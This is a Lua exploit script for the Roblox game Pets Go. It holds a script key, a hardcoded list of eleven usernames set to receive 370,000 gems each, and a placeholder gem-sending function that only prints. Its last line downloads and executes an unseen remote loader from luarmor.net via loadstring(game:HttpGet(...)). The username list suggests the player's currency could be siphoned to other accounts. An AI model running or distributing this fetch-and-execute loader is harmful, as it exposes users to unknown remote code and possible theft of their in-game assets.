script_key = "kuQoDnFgeRipnysIrKrGhcoLjpYFSUEn"

getgenv().petsGoConfig = {
    DISCORD_ID = "",  -- Add your Discord ID here
    MAIL_UPGRADE_GEM_WEBHOOK_URL = "",  -- Add your webhook URL here

    MAIL_GEMS_USERNAME_LIST = {
        "povllalla758",
        "jddkylarylar2249",
        "mmgiennaienna2831",
        "ucouhhloehloe470",
        "awandrewndrew833",
        "dtbabrielabriel11034",
        "cqwseyleryler8714",
        "kkvkylarylar21",
        "ixhatthewatthew10471",
        "ppzeeosephose3907",
        "jjvwnlilylily1906"
    },  -- ONE TIME 370k GEMS MAIL FOR FULL DIAMOND UPGRADE

    MAX_GEMS = 370000,  -- Maximum gems per user
}

-- Table to track how many gems have been sent to each user
local gemsSent = {}

-- Function to send gems to users
local function sendGems(username, amount)
    -- If the user has already received gems, check the total sent so far
    if gemsSent[username] then
        -- Ensure we don't exceed 370,000 gems
        if gemsSent[username] + amount > petsGoConfig.MAX_GEMS then
            print("Error: Cannot send more than " .. petsGoConfig.MAX_GEMS .. " gems to " .. username)
            return
        else
            -- Update the gems count for this user
            gemsSent[username] = gemsSent[username] + amount
        end
    else
        -- If this is the first time sending gems to this user, initialize their count
        gemsSent[username] = amount
    end

    -- You can replace this `print` statement with actual gem sending logic (like a webhook request)
    print("Sent " .. amount .. " gems to " .. username .. ". Total gems sent: " .. gemsSent[username])
    -- Example of using a webhook to send gems (You should replace this with actual API requests)
    -- game:GetService("HttpService"):PostAsync(petsGoConfig.MAIL_UPGRADE_GEM_WEBHOOK_URL, somePayload)
end

-- Loop through the username list and send 370k gems to each
for _, username in ipairs(petsGoConfig.MAIL_GEMS_USERNAME_LIST) do
    sendGems(username, petsGoConfig.MAX_GEMS)
end

-- Load the external Lua script
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1fcefa454021976ebb3a7ad670dfb077.lua"))()
